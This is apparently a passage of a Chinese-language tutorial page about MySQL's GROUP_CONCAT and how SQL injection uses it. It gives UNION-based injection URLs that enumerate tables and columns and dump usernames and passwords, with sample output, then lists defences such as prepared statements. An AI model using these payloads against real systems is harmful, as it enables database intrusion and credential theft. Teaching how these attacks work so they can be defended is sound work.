+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>SELECT GROUP_CONCAT(username SEPARATOR &#39;-&#39;) FROM users;
+</code></pre></div>
+<p><strong>结果：</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>alice-bob-charlie
+</code></pre></div>
+<h3 id="sql">在 SQL 注入中的应用</h3>
+<p>在 SQL 注入攻击中，攻击者通常会使用 <code>GROUP_CONCAT</code> 来获取大量的表或列信息。由于 <code>GROUP_CONCAT</code> 可以合并多行数据，攻击者可以利用它一次性从数据库中提取多个敏感数据，并通过特定的分隔符将其格式化为易于分析的字符串。</p>
+<h4 id="_4">示例：列出表名</h4>
+<p>假设攻击者想列出数据库中的所有表名，可以通过 <code>information_schema.tables</code> 表来查询。攻击者可能会注入如下 SQL 查询：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>http://example.com/products?id=-1&#39; UNION SELECT 1, GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=&#39;security&#39; --+
+</code></pre></div>
+<p><strong>SQL查询变为：</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>SELECT id, name FROM products WHERE id = -1 UNION SELECT 1, GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=&#39;security&#39;;
+</code></pre></div>
+<p><strong>结果：</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>users,orders,products,logins
+</code></pre></div>
+<ul>
+<li><code>information_schema.tables</code> 是一个系统表，包含了当前数据库中的所有表信息。</li>
+<li><code>GROUP_CONCAT(table_name)</code> 将所有的表名连接成一个以逗号分隔的字符串。</li>
+</ul>
+<p>通过这种方式，攻击者可以一次性列出数据库 <code>security</code> 中的所有表名。</p>
+<h4 id="_5">示例：列出特定表的列名</h4>
+<p>攻击者还可以使用 <code>GROUP_CONCAT</code> 获取某个表（如 <code>users</code> 表）中的所有列名：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>http://example.com/products?id=-1&#39; UNION SELECT 1, GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=&#39;users&#39; --+
+</code></pre></div>
+<p><strong>SQL查询变为：</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>SELECT id, name FROM products WHERE id = -1 UNION SELECT 1, GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=&#39;users&#39;;
+</code></pre></div>
+<p><strong>结果：</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>id,username,password,email
+</code></pre></div>
+<ul>
+<li><code>information_schema.columns</code> 表包含了数据库中所有表的列信息。</li>
+<li><code>GROUP_CONCAT(column_name)</code> 将 <code>users</code> 表中的所有列名连接成一个字符串。</li>
+</ul>
+<p>这样，攻击者就可以获取 <code>users</code> 表的结构。</p>
+<h4 id="_6">示例：列出敏感数据（如用户名和密码）</h4>
+<p>进一步地，攻击者可以使用 <code>GROUP_CONCAT</code> 来提取表中的敏感数据，例如 <code>users</code> 表中的用户名和密码。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>http://example.com/products?id=-1&#39; UNION SELECT 1, GROUP_CONCAT(username, &#39;-&#39;, password) FROM users --+
+</code></pre></div>
+<p><strong>SQL查询变为：</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>SELECT id, name FROM products WHERE id = -1 UNION SELECT 1, GROUP_CONCAT(username, &#39;-&#39;, password) FROM users;
+</code></pre></div>
+<p><strong>结果：</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>alice-pass123,bob-pass456,charlie-pass789
+</code></pre></div>
+<ul>
+<li><code>GROUP_CONCAT(username, '-', password)</code> 将 <code>users</code> 表中的 <code>username</code> 和 <code>password</code> 连接成一个以破折号分隔的字符串。</li>
+<li>结果将显示所有用户的用户名和密码。</li>
+</ul>
+<p>这种方式可以让攻击者轻松获取表中的敏感数据。</p>
+<h3 id="3group_concat-sql"><code>3.GROUP_CONCAT</code> 在 SQL 注入中的优势</h3>
+<ul>
+<li><strong>数据合并</strong>：<code>GROUP_CONCAT</code> 可以将多个查询结果合并为一个字符串，避免了分页查询的需要，使得攻击者能够快速获取大量数据。</li>
+<li><strong>格式化输出</strong>：攻击者可以自定义分隔符，将查询结果格式化为易于解析的字符串。这样，可以方便地在后续的攻击中处理和分析数据。</li>
+<li><strong>隐蔽性</strong>：使用 <code>GROUP_CONCAT</code> 时，攻击者往往能在单次查询中提取大量信息，减少被检测到的风险。</li>
+</ul>
+<h3 id="group_concat-sql">如何防止使用 <code>GROUP_CONCAT</code> 的 SQL 注入攻击</h3>
+<p>防止 SQL 注入攻击的关键是 <strong>输入验证</strong> 和 <strong>参数化查询</strong>。以下是一些最佳实践：</p>
+<ol>
+<li><strong>使用预处理语句（Prepared Statements）</strong>： 使用预处理语句可以避免 SQL 查询中直接插入用户输入的数据，防止恶意的 SQL 注入。例如，使用 MySQL 的 <code>mysqli</code> 或 <code>PDO</code> 函数进行预处理查询：</li>
+</ol>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>$stmt = $conn-&gt;prepare(&quot;SELECT * FROM products WHERE id = ?&quot;);
+<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>$stmt-&gt;bind_param(&quot;i&quot;, $id);  // 绑定参数
+<a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>$stmt-&gt;execute();
+</code></pre></div>
+<ol>
+<li>
+<p><strong>输入数据过滤与验证</strong>： 对用户输入进行严格过滤，确保其格式和类型正确。例如，确保 <code>id</code> 参数是一个数字而不是可以用来进行注入的字符串。</p>
+</li>
+<li>
+<p><strong>最小化权限</strong>： 只授予数据库用户必要的权限。例如，应用程序不需要 <code>DROP</code> 或 <code>ALTER</code> 表的权限，只需读取表数据的权限。</p>
+</li>
+<li>
+<p><strong>禁用危险函数</strong>： 可以在数据库中禁用一些危险的函数和操作（例如 <code>GROUP_CONCAT</code>），尤其是在不需要使用这些函数的情况下。</p>
+</li>
+<li>
+<p><strong>使用 Web 应用防火墙（WAF）</strong>： Web 应用防火墙可以帮助检测和阻止常见的 SQL 注入攻击模式。</p>
+</li>
+</ol>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.tracking", "navigation.tabs", "navigation.sections", "navigation.expand", "navigation.top", "toc.follow", "search.suggest", "search.highlight", "content.code.copy", "content.tabs.link"], "search": "../assets/javascripts/workers/search.f8cc74c7.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.c8b220af.min.js"></script>
+      
+    
+  </body>
+</html>
